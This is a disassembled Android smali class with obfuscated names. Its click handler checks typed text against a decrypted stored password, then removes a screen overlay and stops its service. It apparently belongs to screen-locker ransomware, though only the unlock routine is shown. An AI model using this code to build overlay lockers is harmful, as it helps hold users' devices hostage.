.class Lcom/h/s$100000001;
.super Ljava/lang/Object;
.source "s.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/h/s;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final this$0:Lcom/h/s;


# direct methods
.method constructor <init>(Lcom/h/s;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    return-void
.end method

.method static access$0(Lcom/h/s$100000001;)Lcom/h/s;
    .locals 1

    iget-object v0, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 191
    :try_start_0
    iget-object v0, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    iget-object v0, v0, Lcom/h/s;->ed:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-interface {v0}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    iget-object v1, v1, Lcom/h/s;->des:Lcom/h/DU;

    iget-object v2, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    iget-object v2, v2, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v3, "passw"

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 193
    iget-object v0, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-static {v0}, Lcom/h/s;->access$L1000001(Lcom/h/s;)Landroid/view/WindowManager;

    move-result-object v0

    iget-object v1, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-static {v1}, Lcom/h/s;->access$L1000002(Lcom/h/s;)Landroid/view/View;

    move-result-object v1

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 194
    iget-object v0, p0, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-virtual {v0}, Lcom/h/s;->stopSelf()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method
